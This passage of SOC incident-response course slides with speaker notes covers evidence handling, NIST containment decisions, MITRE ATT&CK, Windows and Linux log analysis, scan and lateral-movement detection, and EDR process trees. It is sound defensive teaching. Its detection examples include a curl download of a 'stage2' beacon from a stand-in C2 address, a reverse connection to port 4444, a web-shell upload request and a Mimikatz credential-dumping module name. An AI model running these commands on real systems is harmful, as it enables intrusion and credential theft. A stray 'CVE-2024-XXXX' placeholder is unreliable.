After capturing volatile evidence, analysts generate SHA-256 cryptographic hashes of each disk image file immediately upon acquisition. These hash values serve as the integrity verification fingerprint: if the image file is later questioned in court, the analyst can demonstrate that the current file produces the same SHA-256 hash as the one recorded at the time of collection, proving it has not been tampered with. The chain of custody log documents every person who handled each piece of evidence, the date and time of each transfer, the storage location, and the purpose of each access. This documentation is required for evidence admissibility in legal proceedings and for compliance with frameworks such as NIST SP 800-61r2 and ISO/IEC 27035 (Information Security Incident Management), which both mandate documented evidence handling procedures.
:::

%%%
---
unit: Containment
code: DEC
title: Containment & Response Decisions (NIST SP 800-61)
---
:::callout style=soft
Once an incident is confirmed, the analyst must make a containment decision. Under **NIST SP 800-61r2**, containment strategies must balance business impact against the risk of continued compromise.
:::

:::steps
**Identify Compromise Scope:** Determine which hosts, accounts, and network segments are affected.
**Select Containment Strategy:**
- *Short-Term Isolation:* Block IPs at the firewall, disable affected user accounts.
- *Long-Term Containment:* Isolate servers to a quarantine VLAN, apply temporary ACLs.
- *Eradication:* Re-image infected hosts, rotate all compromised credentials.
**Validate Containment:** Confirm that malicious network traffic and anomalous host behavior have stopped.
**Continuous Monitoring:** Maintain heightened monitoring on the affected assets to detect reappearance.
:::

:::image src="images/28_containment_decision_tree.png" alt="Decision tree diagram starting at the top with a diamond node labeled 'Is the incident confirmed malicious?'; left branch (No) leads to 'Continue Monitoring, Close ticket as False Positive'; right branch (Yes) leads to second diamond labeled 'Is a critical production service affected?'; left branch (No) leads to 'Apply Short-Term Containment: block IP, disable account, apply ACL'; right branch (Yes) leads to third diamond labeled 'Can the service be temporarily degraded?'; left branch (No) leads to 'Apply Tactical Containment: quarantine VLAN, monitor closely'; right branch (Yes) leads to 'Coordinate downtime window, apply Long-Term Containment'; all containment paths converge at bottom box labeled 'Validate: Check firewall and SIEM for continued malicious traffic, proceed to Eradication only after validation'; a note box references NIST SP 800-61r2 Section 3.3" caption="Containment decision tree under NIST SP 800-61r2: the analyst balances business continuity risk (production service impact) against security risk (continued compromise) to select the appropriate containment strategy. All paths require post-containment validation before eradication begins." width=full
:::

:::notes
After identifying the attack and gathering sufficient evidence to confirm that an incident is real and not a false positive, the SOC analyst must make containment decisions under time pressure. NIST Special Publication 800-61 Revision 2, "Computer Security Incident Handling Guide," provides the authoritative framework for this decision-making process in U.S. government and industry contexts. Its incident response lifecycle defines four phases: Preparation, Detection and Analysis, Containment/Eradication/Recovery, and Post-Incident Activity. The containment phase is where the analyst's decisions directly determine how much additional damage the attacker can inflict.

Containment strategy selection requires explicitly weighing two competing risks. The security risk is the cost of allowing the attacker to continue operating: additional data exfiltration, lateral movement to additional hosts, destruction of evidence, or installation of additional persistent access mechanisms. The business risk is the cost of containment actions on operational continuity: a web server taken offline means customer transactions cannot be processed; a database isolated to a quarantine VLAN means dependent applications fail; disabling a user account may prevent a business-critical workflow from running. NIST SP 800-61r2 Section 3.3.1 explicitly states that organizations should develop criteria for selecting containment strategies based on the potential damage to resources, the need to preserve evidence, service availability requirements, time and resources needed to implement the strategy, and the expected effectiveness of the containment.

Short-term containment consists of immediate, low-disruption actions applied without taking systems offline. Blocking the attacker's source IP addresses at the perimeter firewall eliminates inbound access without affecting other users. Disabling the compromised user account (without deleting it, to preserve audit logs) prevents that credential from being reused while leaving the system functional for other accounts. Applying temporary access control lists to restrict traffic to and from the affected host limits lateral movement potential without a full quarantine.

Long-term containment is appropriate when short-term measures are insufficient or when evidence suggests deep system compromise. Isolating the affected server to a dedicated quarantine VLAN disconnects it from production network segments while keeping it powered on for continued forensic analysis. Deploying enhanced monitoring, increased SIEM verbosity, full packet capture on the quarantine segment, provides visibility into any remaining attacker activity.

Eradication follows validated containment: only after confirming that all malicious traffic has stopped should the SOC proceed to re-imaging affected hosts, rotating all credentials that may have been exposed (including service accounts, API keys, and shared infrastructure passwords), and applying patches for the vulnerabilities exploited during the attack. ISO/IEC 27035 Part 2 provides complementary guidance for the recovery and lessons-learned phases that follow eradication.
:::

%%%
---
unit: Summary
code: SUM
title: Incident Response Synthesis
---
:::callout style=soft
Operational security requires translating raw logs into actionable incident reports and containment decisions.
:::

::::columns ratio=1:1
::col::
::::card heading="Investigation Review"
:::list style=tight
- **Telemetry:** Ingesting and normalizing logs from Windows, Syslog, and web applications.
- **Correlation:** Linking multiple events to build a forensic timeline of the attack.
- **Decisions:** Preserving evidence using RFC 3227 and executing containment under NIST SP 800-61r2.
:::
::::
::col::
::::card heading="Lab Assessment Tasks"
:::list style=tight
- **Task 1:** Analyze authentication logs to identify brute-force vs password spraying.
- **Task 2:** Parse web access logs to identify SQL Injection and web shells.
- **Task 3:** Create a chronological timeline and draft a containment proposal.
:::
::::
::::

:::image src="images/28_incident_response_synthesis.png" alt="Circular lifecycle diagram with four quadrants representing the NIST SP 800-61r2 incident response phases: top-left quadrant in blue labeled 'Preparation, runbooks, SIEM tuning, contact lists'; top-right quadrant in yellow labeled 'Detection and Analysis, log triage, forensic timeline, IoC extraction'; bottom-right quadrant in orange labeled 'Containment, Eradication, Recovery, isolation, re-image, patch, rotate credentials'; bottom-left quadrant in green labeled 'Post-Incident Activity, lessons learned, detection rule updates, report'; clockwise arrows connect each quadrant; at the center of the circle a smaller inner ring lists the key frameworks: RFC 3227, NIST SP 800-61r2, MITRE ATT&CK, NIST CSF 2.0 DETECT/RESPOND; a callout box outside the circle reads 'This lab focused on Detection and Analysis, and Containment, the two phases most requiring analyst judgment'" caption="NIST SP 800-61r2 incident response lifecycle: today's lab concentrated on Detection and Analysis (timeline construction, log parsing, correlation) and the Containment/Eradication phase (decision-making and validation). Preparation and Post-Incident Activity are the organizational phases that make the operational phases effective." width=full
:::

:::notes
In today's lab, we moved from the architectural design perspective of Class 27 into the operational reality of incident response. A security architecture that is never exercised in realistic conditions, and a SOC that has never run a live investigation, provide a false sense of security. Today's exercises were designed to build the analytical habits and tool proficiency that make the difference between rapid, effective incident response and the chaotic, slow reactions that allow attackers to maximize their impact before containment.

We began by examining the Security Operations Center structure, the tiered analyst model that manages the impossible information volume of enterprise telemetry by applying structured triage and escalation. The MTTD and MTTR metrics that characterize SOC performance are not abstract administrative measures; they represent the actual window of time during which an attacker can operate before being stopped. IBM's 2024 Cost of a Data Breach Report found that breaches where MTTD exceeded 200 days cost an average of $5.46 million, while those identified and contained within 200 days cost $3.93 million, a $1.53 million difference attributable primarily to the time the attacker had to exfiltrate and destroy data.

We analyzed four telemetry types, Windows Security Event logs, Linux Syslog per RFC 5424, Nginx/Apache access logs, and network firewall connection logs, and examined the specific field combinations that reveal each attack technique. Each source provides a different view of the kill chain: network reconnaissance (firewall), credential attacks (Active Directory logs), web exploitation (web server logs), and post-exploitation execution (EDR agent). No single source tells the complete story; the SIEM's normalization and correlation engine is what synthesizes them into the unified attack picture that enables effective triage.

The MITRE ATT&CK framework provides a shared taxonomy for describing what we observed today: T1046 (Network Service Discovery), T1110 (Brute Force), T1190 (Exploit Public-Facing Application), T1505.003 (Web Shell), and T1059 (Command and Scripting Interpreter). Using this taxonomy in incident reports enables the SOC to measure detection coverage and communicate findings consistently across teams and organizations.

Finally, RFC 3227 and NIST SP 800-61r2 provide the procedural framework that ensures evidence collected during an investigation is legally valid and that containment decisions are defensible. These are not bureaucratic formalities, they are the professional standards that protect both the organization and the analyst when incident findings are reviewed by leadership, regulators, or courts.

Now it is your turn to apply these principles in the lab environment. You will analyze a set of raw log files, reconstruct a multi-stage attack using the forensic timeline method, and draft an incident report with recommended containment steps. This hands-on experience will prepare you for Class 29's proactive risk assessment project and the Class 30 capstone. Let's begin.
:::

%%%
---
unit: Framework
code: ATT
title: MITRE ATT&CK Framework Deep Dive
---
:::callout style=soft
**MITRE ATT&CK** (Adversarial Tactics, Techniques, and Common Knowledge) is a globally accessible, curated knowledge base of adversary behavior based on real-world observations. SOC teams use it to classify attacker activity, measure detection coverage, and build detection rules.
:::

:::table
| ATT&CK Layer | Description | Lab Example |
|---|---|---|
| **Tactic** | The attacker's high-level goal | Initial Access, Execution, Persistence |
| **Technique** | The method used to achieve the tactic | T1190 Exploit Public-Facing Application |
| **Sub-Technique** | A specific variant of the technique | T1505.003 Web Shell |
| **Procedure** | The specific tool or command observed | `curl -X POST /uploads/shell.php` |
| **Mitigation** | Defensive control mapped to the technique | M1030 Network Segmentation |
| **Detection** | Data sources and analytics to detect the technique | Web server logs, process monitoring |
:::

:::list style=tight
- ATT&CK Enterprise matrix covers **14 tactics** and **over 200 techniques** applicable to Windows, Linux, and cloud environments.
- The **ATT&CK Navigator** tool allows SOC teams to color-code the matrix by detection coverage, highlighting blind spots.
- NIST SP 800-53 security controls can be cross-mapped to ATT&CK mitigations for compliance-driven defense planning.
:::

:::image src="images/28_mitre_attack_matrix.png" alt="Simplified MITRE ATT&CK Enterprise matrix rendered as a grid of colored cells; columns are labeled with the 14 tactics: Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact; rows contain technique names as colored cells; four cells are highlighted in bright red corresponding to the lab scenario: T1046 (Discovery), T1110 (Credential Access), T1505.003 (Persistence), T1059 (Execution); a legend in the corner shows red=detected in lab, grey=not covered by current rules, green=covered by existing SIEM rules" caption="MITRE ATT&CK Enterprise matrix with the lab scenario techniques highlighted: the four observed techniques span four different tactic columns, illustrating how a single attack campaign touches multiple phases of the matrix simultaneously." width=full
:::

:::notes
MITRE ATT&CK was first published in 2013 by MITRE Corporation, a US federally funded research and development center. It was originally built from observations of adversary behavior against Microsoft Windows enterprise environments, but has since expanded to cover Linux, macOS, mobile, ICS (industrial control systems), and cloud platforms. Today it is maintained as a freely accessible knowledge base at attack.mitre.org and is widely adopted by SOC teams, red teams, threat intelligence analysts, and security product vendors as the de facto standard taxonomy for describing attacker behavior.

The framework is structured in a hierarchy: Tactics are the "why", the strategic goal the attacker is pursuing at each phase (e.g., gaining Initial Access to the target environment, or achieving Persistence so they survive a reboot). Techniques are the "how", the specific method used to accomplish the tactic (e.g., T1190 Exploit Public-Facing Application, which covers exploitation of vulnerabilities in internet-accessible services). Sub-techniques provide additional specificity for techniques that have multiple distinct variants (e.g., T1505.003 Web Shell is a sub-technique of T1505 Server Software Component, capturing the specific case of using a web-accessible script for persistent command execution). At the bottom of the hierarchy, Procedures are specific observed instances: the exact command, tool, or script an adversary used in a real attack, documented in ATT&CK threat intelligence reports.

Each technique entry in ATT&CK also includes Mitigations, numbered M-codes such as M1030 Network Segmentation or M1049 Antivirus/Antimalware, which cross-map to NIST SP 800-53 security controls and CIS Controls, enabling security engineers to plan defenses systematically. Detection guidance describes which data sources (Windows Event Logs, network traffic, process monitoring) and analytics patterns an analyst or SIEM rule should look for to identify the technique in action.

A powerful operational use of ATT&CK is coverage mapping with the ATT&CK Navigator, an open-source web application that lets SOC teams color-code the full matrix by their current detection capabilities. Cells colored green have a validated SIEM correlation rule or EDR detection. Cells colored red are blind spots, the technique could be used against the organization with no automated detection. This visual map enables the SOC manager to prioritize detection engineering work on the highest-risk uncovered techniques, and to demonstrate to leadership and auditors exactly which attacker behaviors the current security stack can and cannot detect.

The ATT&CK entry for PowerShell (T1059.001) lists real-world procedure examples from documented campaigns by groups such as APT28 and Lazarus, which grounds the abstract technique in concrete historical attacks.
:::

%%%
---
unit: Tools
code: EVID
title: Tool Spotlight, Windows Event IDs Reference
---
:::callout style=soft
Windows Security Event logs are controlled by Audit Policies. Knowing which **Event IDs** to search for is a core analyst skill, each ID maps to a specific security-relevant action on the Windows system.
:::

:::table
| Event ID | Category | Description | Attack Relevance |
|---|---|---|---|
| **4624** | Logon | Successful account logon | Confirms attacker gained access; check LogonType and SourceIP |
| **4625** | Logon | Failed account logon | Brute-force and password spray detection |
| **4648** | Logon | Logon using explicit credentials | Lateral movement via runas or credential-passing techniques |
| **4688** | Process | New process created | Malicious process execution; check ParentProcessName and CommandLine |
| **4698** | Scheduled Task | Scheduled task created | Persistence via Task Scheduler (MITRE T1053.005) |
| **4720** | Account | User account created | Attacker-created backdoor account |
| **4740** | Account | Account locked out | Confirms brute-force hit lockout threshold |
| **1102** | Audit Log | Audit log cleared | Anti-forensics, attacker covering tracks |
| **7045** | Service | New service installed | Persistence or privilege escalation via malicious service |
:::

:::image src="images/28_windows_event_id_reference.png" alt="Illustration of a Windows Event Viewer interface showing a list of security events; key Event IDs are annotated with colored badges: 4624 in green labeled 'Successful Logon', 4625 in red labeled 'Failed Logon', 4688 in orange labeled 'Process Creation', 4698 in purple labeled 'Scheduled Task Created', 1102 in dark red labeled 'Log Cleared, CRITICAL'; a side panel shows a drill-down view of Event ID 4688 with annotated fields: Subject Account Name (jsmith), New Process Name (cmd.exe), Creator Process Name (w3wp.exe, the IIS worker process), Process Command Line (whoami), with an alert callout reading 'Web server spawning cmd.exe = probable web shell execution'" caption="Windows Event ID quick reference: the Event Viewer displays security log entries by ID. Event 4688 showing w3wp.exe spawning cmd.exe is a high-fidelity indicator of web shell command execution, this correlation between parent and child process names is the key field pair for this detection." width=full
:::

:::notes
Windows Security Event logging is the foundation of host-based forensic analysis in Windows enterprise environments. However, not all events are enabled by default, Windows Audit Policy must be explicitly configured to log the event categories that matter for security monitoring. The Windows Security Auditing documentation (available in Microsoft's Security Compliance Toolkit) defines which audit policy subcategories generate each Event ID. A misconfigured audit policy is a significant blind spot: many organizations discover during an incident that the Event IDs most relevant to the investigation were never being generated because the corresponding audit subcategory was disabled.

For this class, the most important Event IDs to internalize are those shown in the table. Event IDs 4624 and 4625 are the logon success and failure events that drive authentication anomaly detection. Event ID 4648, Logon using explicit credentials, is specifically generated when a process uses credentials other than the currently logged-in user, which is the signature of lateral movement techniques such as Pass-the-Hash (MITRE T1550.002) or using `runas` with a different user's credentials. Many organizations miss 4648 because they focus only on 4624 and 4625.

Event ID 4688 (New Process Created) is perhaps the most forensically rich event when Process Creation Auditing is enabled with command-line logging. It records the full command-line string of every new process, enabling analysts to detect encoded PowerShell commands (`powershell.exe -EncodedCommand ...`), Mimikatz execution, or living-off-the-land techniques using legitimate Windows binaries for malicious purposes (LOLBins). The parent process name field is particularly valuable: a web application process (w3wp.exe for IIS) spawning cmd.exe or powershell.exe is an extremely high-confidence indicator of web shell command execution, exactly the scenario we identified in the web log analysis slide.

Event ID 1102 deserves special mention: it is generated when the Windows Security Audit Log is cleared. An attacker who successfully clears the local event log is attempting to eradicate the forensic record of their activity. This event generates a brief entry before the log is cleared, and if logs are being forwarded to a remote SIEM in real time, the SIEM will have retained all events generated before the clearing action. The 1102 event itself in the SIEM is a high-priority alert requiring immediate investigation, as it indicates the attacker has achieved sufficient privilege to modify audit logs (typically requiring local administrator or Domain Admin access).

Windows audit policies are set under Local Security Policy (Local Policies, Audit Policy), and in enterprise environments Group Policy pushes that configuration to every domain-joined machine centrally, so audit coverage is consistent across the estate.
:::

%%%
---
unit: Analysis
code: LIN
title: Linux Log Analysis Deep Dive
---
:::callout style=soft
Linux systems record security-relevant events in structured log files under `/var/log/`. Analysts must know which files to query and what patterns indicate compromise, privilege escalation, or unauthorized access.
:::

:::code language=text caption="Linux auth.log entries showing SSH brute-force followed by successful login and sudo escalation"
Jun 30 02:09:11 webserver01 sshd[3221]: Failed password for invalid user admin from 198.51.100.45 port 54201 ssh2
Jun 30 02:09:14 webserver01 sshd[3221]: Failed password for root from 198.51.100.45 port 54201 ssh2
Jun 30 02:09:33 webserver01 sshd[3241]: Accepted password for deploy from 198.51.100.45 port 54210 ssh2
Jun 30 02:09:35 webserver01 sudo[3290]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
Jun 30 02:09:35 webserver01 sudo[3290]: pam_unix(sudo:session): session opened for user root by deploy(uid=1000)
:::

:::list style=tight
- **`/var/log/auth.log`** (Debian/Ubuntu) or **`/var/log/secure`** (RHEL/CentOS): SSH, sudo, PAM authentication events.
- **`/var/log/syslog`**: General system events including daemon starts/stops and cron execution.
- **`/var/log/wtmp`** / **`last` command**: Historical login records including login time, source IP, and terminal.
- **`/var/log/btmp`** / **`lastb` command**: Records of failed login attempts.
- **`/proc/` virtual filesystem**: Live process and network state, captured as part of volatile memory triage.
:::

:::image src="images/28_linux_log_analysis.png" alt="Split-screen terminal view: left panel shows a tail of /var/log/auth.log with color-coded lines, red lines labeled 'Failed password' with source IP annotations, green line labeled 'Accepted password for deploy', orange lines labeled 'sudo session opened for root'; right panel shows analyst SIEM queries, first query reads 'index=linux sourcetype=syslog message=Failed | stats count by src_ip' with result showing 198.51.100.45 with 47 failures; second query reads 'index=linux sourcetype=syslog message=Accepted | join src_ip [search Failed]' linking the successful login back to the same brute-forcing IP; annotations highlight the 22-second gap between last failure and successful login" caption="Linux auth.log forensic analysis: 47 failed password attempts from 198.51.100.45 are followed by a successful login 22 seconds later, then an immediate sudo escalation to root, a classic SSH brute-force to privilege escalation chain." width=full
:::

:::notes
Linux systems are ubiquitous in enterprise environments as web servers, database servers, containerization hosts, and cloud infrastructure nodes. Understanding Linux log analysis is essential for any SOC analyst working in environments that are not purely Windows-based, and most real enterprise environments are heterogeneous. The log entries shown on this slide represent a complete attack sequence that mirrors the Windows brute-force pattern we studied earlier, but implemented through SSH against a Linux web server.

Reading the auth.log entries in sequence reveals the attack story. The first two lines show failed authentication attempts against the usernames "admin" and "root", both common default or privileged account names that attackers try. The "invalid user admin" message indicates that no local account named "admin" exists, while the failed attempt against "root" indicates the root account exists but the password was wrong (or root SSH login is disabled via `PermitRootLogin no` in the sshd_config, which is a hardening best practice). These failed attempts establish that the attacker is conducting a dictionary-based brute-force against common usernames.

The third line, "Accepted password for deploy", is the critical pivot. The attacker successfully authenticated as the "deploy" user, a service account commonly created for automated deployment workflows. Service accounts often have weaker passwords than user accounts because they were created for automated use and the password was set years ago before a password rotation policy was enforced. This is a known risk documented in NIST SP 800-63B (Digital Identity Guidelines), which recommends that service account credentials be treated with the same rigor as user credentials.

The fourth and fifth lines show something more alarming: within two seconds of the successful SSH login, the deploy account executes `sudo /bin/bash`, escalating to a full root shell. The sudo line records the full command, the current working directory, and the target user. This tells us two things: the deploy account has passwordless sudo access to /bin/bash (a severe misconfiguration), and the attacker knew to try this immediately (suggesting they had prior knowledge of the account's sudo privileges, possibly from a previously compromised configuration file or from public code repository leakage of the server's setup scripts).

The `lastb` command (or `/var/log/btmp`) records all failed login attempts and is particularly useful for historical analysis because it is separate from auth.log and harder to clear without leaving evidence. The `/proc/` virtual filesystem provides real-time state during a live investigation: `/proc/net/tcp` shows all open TCP connections, `/proc/<pid>/cmdline` shows the command line of each running process, and `/proc/<pid>/maps` shows the memory-mapped files of a process, useful for detecting in-memory malware that injected into a legitimate process.

On Linux, lastb and last list failed and successful logins respectively, and comparing the two makes an attack sequence, repeated failures followed by a success, immediately visible.
:::

%%%
---
unit: Analysis
code: SCAN
title: Worked Example, Network Scanning Detection
---
:::callout style=soft
Network scanning is typically the **first observable phase** of an attack (MITRE ATT&CK T1046, Network Service Discovery). Firewall logs capture scan patterns that are invisible to host-level logging.
:::

:::code language=text caption="Firewall log snippet showing a TCP SYN port scan from a single source"
2026-06-30T02:11:03Z DENY TCP 198.51.100.45:52001 -> 10.0.1.20:22 SYN
2026-06-30T02:11:03Z DENY TCP 198.51.100.45:52002 -> 10.0.1.20:23 SYN
2026-06-30T02:11:03Z DENY TCP 198.51.100.45:52003 -> 10.0.1.20:80 SYN_ACK_RECV
2026-06-30T02:11:04Z DENY TCP 198.51.100.45:52004 -> 10.0.1.20:443 SYN_ACK_RECV
2026-06-30T02:11:04Z DENY TCP 198.51.100.45:52005 -> 10.0.1.20:3389 SYN
2026-06-30T02:11:05Z DENY TCP 198.51.100.45:52006 -> 10.0.1.20:8080 SYN
[... 39 more entries, all from 198.51.100.45, all to different destination ports ...]
:::

:::steps
**Identify the pattern:** Single source IP connecting to many different destination ports on the same target host within seconds.
**Classify the scan type:** SYN packets without completed handshakes = TCP SYN scan (Nmap default, stealthy, never establishes a full connection).
**Extract the IoC:** Source IP 198.51.100.45 is the attacker; destination 10.0.1.20 is the target host.
**Cross-reference:** Search all other log sources for 198.51.100.45 to find what actions followed the scan.
**Determine open ports:** Any entry showing SYN_ACK_RECV (or ALLOW) indicates a port responded, those are the attack surface the attacker discovered.
:::

:::image src="images/28_network_scan_detection.png" alt="Firewall log visualization: a vertical list of log entries on the left with source IP 198.51.100.45 highlighted in red; destination ports are annotated with service names (22=SSH, 23=Telnet, 80=HTTP, 443=HTTPS, 3389=RDP, 8080=HTTP-Alt); a bar chart on the right shows 'Connections per Destination Port' with all bars colored red for DENY and two bars colored green for ports 80 and 443 labeled ALLOW/SYN-ACK; a timeline shows all 45 connections occurring within a 4-second window; an annotation reads 'Rate: 11.25 connections/second, consistent with Nmap default timing (-T3)'; a SIEM query box shows 'src_ip=198.51.100.45 | stats count(distinct dst_port) as ports_scanned | where ports_scanned > 20'" caption="Firewall log port scan visualization: 45 TCP SYN connections from 198.51.100.45 to 45 different ports on 10.0.1.20 within 4 seconds, a textbook Nmap SYN scan. Ports 80 and 443 show SYN-ACK responses, revealing the web server attack surface the attacker will exploit next." width=full
:::

:::notes
Network scanning is the reconnaissance activity that precedes nearly every targeted attack. The attacker's goal is to discover which services are running on the target host so they can select an exploitation strategy. The most common scanning tool is Nmap (Network Mapper), an open-source tool used by both penetration testers and malicious actors, which generates the characteristic SYN scan pattern visible in this slide's log excerpt.

A TCP SYN scan works by sending a SYN packet to each target port and analyzing the response. If the port is open, the target responds with SYN-ACK (acknowledging the connection request). If the port is closed, the target responds with RST (reset). If the port is filtered by a firewall, no response arrives. The scanning tool never completes the three-way handshake (SYN → SYN-ACK → ACK), which is why this is called a "half-open" or "stealth" scan, it leaves no completed connection record in the application's connection log, only in the firewall's packet-level log. Without firewall logging, this reconnaissance activity would be entirely invisible.

The analytical pattern for detecting a port scan in firewall logs is: a single source IP generating connections to many different destination ports on the same target host within a short time window. The SIEM query shown in the image implements this detection: group connections by source IP and count the number of distinct destination ports; if one source IP has connected to more than 20 different ports within a 60-second window, generate a scan alert. The threshold of 20 ports is calibrated to avoid false positives from legitimate services that probe multiple ports (e.g., load balancers performing health checks), while catching the 45-port scan in this example with high confidence.

The scan results in this example reveal the attack surface: ports 80 and 443 responded with SYN-ACK, meaning the web server is listening on both HTTP and HTTPS. This is the intelligence that directs the attacker's next action, moving from network reconnaissance (T1046) to exploitation of the web application (T1190), which is exactly what we see in the subsequent web server log entries at 02:14 UTC. This causal chain between the scan result and the subsequent exploitation attempt is a key finding to document in the incident timeline.

CVE-2024-XXXX aside, the identification of open ports is not itself a vulnerability, but it dramatically reduces the attacker's work by eliminating 43 ports that are firewalled and focusing attention on the 2 that are accessible. This illustrates why network segmentation (NIST SP 800-41, Guidelines on Firewalls and Firewall Policy) is a critical control: if only the ports required for legitimate business functions are permitted, the attacker's discovered attack surface is minimized from the start.
:::

%%%
---
unit: Analysis
code: LAT
title: Lateral Movement Detection
---
:::callout style=soft
After gaining initial access, attackers move laterally to compromise additional systems. **Lateral movement** appears as unusual internal network authentication events, particularly network logons (Type 3) between workstations or servers that do not normally communicate.
:::

::::columns ratio=1:1
::col::
::::card heading="Common Lateral Movement Techniques"
:::list style=tight
- **Pass-the-Hash (T1550.002):** Reuse NTLM password hash without knowing plaintext.
- **Pass-the-Ticket (T1550.003):** Forge or steal Kerberos tickets (Golden Ticket attack).
- **Remote Services (T1021):** RDP, SMB, SSH, WinRM to pivot between hosts.
- **PsExec / WMI (T1047, T1569.002):** Execute code remotely on another host using admin credentials.
:::
::::
::col::
::::card heading="Detection Signals"
:::list style=tight
- **Event ID 4624 LogonType=3** from unexpected internal source IPs.
- **Event ID 4648**, explicit credential use, especially by service accounts.
- **Event ID 4776**, NTLM authentication event (indicates hash-based auth).
- **Firewall alerts** on SMB (TCP 445) or RDP (TCP 3389) between internal segments.
:::
::::
::::

:::image src="images/28_lateral_movement_detection.png" alt="Network topology diagram showing three network segments separated by internal firewalls: left segment labeled 'DMZ' contains a web server at 10.0.1.20 marked with a red flame icon labeled 'Compromised'; center segment labeled 'Internal Network' contains workstation WS-01 at 10.10.1.50 and WS-02 at 10.10.1.51; right segment labeled 'Domain Controllers' contains DC-01 at 10.20.0.10; red arrows show lateral movement paths: from 10.0.1.20 to WS-01 via SMB TCP 445 labeled 'Pass-the-Hash via SMB, Event 4624 LogonType=3'; from WS-01 to DC-01 via TCP 3389 labeled 'RDP pivot, Event 4624 LogonType=10'; SIEM alert banners overlay each red arrow with severity ratings; a green baseline reference box shows 'Normal: DMZ has no internal auth events'" caption="Lateral movement detection: the compromised DMZ web server initiates SMB authentication to internal workstation WS-01, an event that should never occur under normal operations. The SIEM baseline for the DMZ segment contains no internal authentication events, making this single Event ID 4624 (LogonType=3) from 10.0.1.20 to 10.10.1.50 an immediate high-confidence alert." width=full
:::

:::notes
Initial access to a single host is rarely the attacker's end goal. In most enterprise intrusions, the initial compromised host is not the high-value target, it is a stepping stone. The attacker's objective is typically to reach domain controllers (which control the entire Active Directory environment), financial systems, intellectual property repositories, or backup infrastructure. To reach these targets, they must move laterally across the internal network, compromising additional hosts one by one until they reach a system with access to the target data.

Lateral movement detection is one of the most analytically challenging problems in SOC work. The reason is that the techniques attackers use for lateral movement are the same legitimate protocols and tools used for normal IT administration. SMB file sharing, RDP remote desktop, WMI scripting, and PsExec remote execution are all used daily by IT administrators. The difference between a legitimate IT connection and an attacker's lateral movement is context: who is initiating the connection, from which source, to which destination, at what time, and whether the source account has legitimate business reason to connect to the destination.

This is where behavioral baselines become essential. If the SIEM has been collecting normal authentication traffic for several weeks, it can establish a baseline of which hosts normally initiate network logons to which destinations. A web server in the DMZ (10.0.1.20) should have zero instances of Event ID 4624 (LogonType=3, network logon) to internal workstations or domain controllers, there is no legitimate business reason for a web server to authenticate to those systems. The appearance of even a single such event from a DMZ host to an internal host is a high-confidence alert with essentially zero false positive rate given a properly established baseline.

Pass-the-Hash deserves special attention because it does not require the attacker to know the plaintext password, only the NTLM hash stored in Windows memory (accessible via tools like Mimikatz, CVE-related memory reads, or the `sekurlsa::logonpasswords` module). NTLM authentication events are recorded in Event ID 4776 on domain controllers, and can be distinguished from Kerberos authentication. An environment that has disabled NTLM entirely (enforcing Kerberos only) eliminates this entire class of lateral movement technique, though NTLM cannot always be fully disabled in legacy environments.

The Golden Ticket attack (MITRE T1558.001) exploits the Kerberos authentication protocol by forging a Ticket Granting Ticket (TGT) using the KRBTGT account's password hash. A forged TGT can impersonate any user in the domain, including Domain Admins, and is valid for the default Kerberos ticket lifetime (10 hours, up to 7 days with renewal). Detection requires monitoring for Kerberos tickets with unusual characteristics, such as tickets with lifetimes longer than the domain default or tickets for accounts that have not recently authenticated interactively.
:::

%%%
---
unit: Tools
code: EDR
title: Tool Spotlight, Endpoint Detection & Response (EDR)
---
:::callout style=soft
**Endpoint Detection & Response (EDR)** tools provide continuous, real-time monitoring of host-level activity, process creation, file writes, registry modifications, and network connections, far beyond what Windows Event Logs alone capture.
:::

:::table
| EDR Capability | What It Detects | Example Detection |
|---|---|---|
| **Process Tree Monitoring** | Parent-child process relationships | `w3wp.exe → cmd.exe → whoami` |
| **File System Telemetry** | File creation, modification, deletion | `shell.php` written to `/uploads/` |
| **Registry Monitoring** | Persistence keys, run keys, service entries | `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` |
| **Network Telemetry** | Per-process outbound connections | `powershell.exe → 203.0.113.50:4444` |
| **Memory Scanning** | Injected shellcode, process hollowing | PE header in non-PE memory region |
| **Behavioral Detection** | Anomaly scoring vs. behavioral baseline | `lsass.exe` memory read by non-system process |
:::

:::list style=tight
- Popular EDR platforms: **CrowdStrike Falcon**, **Microsoft Defender for Endpoint**, **SentinelOne**, **Carbon Black**, **Elastic Endpoint**.
- EDR data integrates with SIEM via API or agent forwarding, enriching SIEM alerts with process tree context.
- MITRE ATT&CK Evaluations independently test EDR vendor detection rates against simulated APT campaigns.
:::

:::image src="images/28_edr_process_tree.png" alt="EDR console screenshot mockup showing a process tree visualization: at the root, a green node labeled 'nginx (PID 1120)' is the web server parent process; branching from it, a yellow-orange node labeled 'sh (PID 3341), spawned at 02:16:04 UTC'; branching from sh, a red node labeled 'whoami (PID 3342)'; branching from sh again, a red node labeled 'curl -o /tmp/beacon http://203.0.113.50/stage2 (PID 3343)'; branching from that, a red node labeled 'chmod +x /tmp/beacon (PID 3344)'; each red node has an alert badge; a right-side detail panel shows file hash for curl command, network connection details to 203.0.113.50:443, and a 'Threat Score: 98/100, MALICIOUS' badge; a timeline at the bottom maps each process to the 02:16 UTC timestamp window" caption="EDR process tree for the web shell execution: nginx spawns sh (the web shell's command executor), which sequentially runs whoami (reconnaissance), downloads a stage-2 payload from the C2 server, and makes it executable, a complete post-exploitation sequence captured in one view." width=full
:::

:::notes
While Windows Event Logs and Syslog provide invaluable visibility into system activity, they have significant gaps. Windows Event ID 4688 records process creation, but requires specific audit policy configuration and does not capture file writes, registry changes, or network connections made by each process in a correlated view. Syslog on Linux records authentication events well but provides limited visibility into in-memory activity. EDR tools fill these gaps by deploying a kernel-level agent on every monitored endpoint that intercepts system calls and records a comprehensive, correlated telemetry stream covering process, file, registry, network, and memory events simultaneously.

The most powerful EDR capability for incident response is the process tree view. When an attacker executes a command via a web shell, the sequence of events creates a characteristic parent-child process chain: the web server process (nginx, apache2, or IIS's w3wp.exe) spawns a shell interpreter (sh, bash, cmd.exe, or powershell.exe), which in turn spawns the attacker's command (whoami, net user, ipconfig). This three-level chain, web server → shell → command, is highly anomalous and would never occur in normal web server operation. EDR platforms assign behavioral anomaly scores to such chains and generate high-confidence alerts automatically, without requiring a pre-written signature for the specific command used.

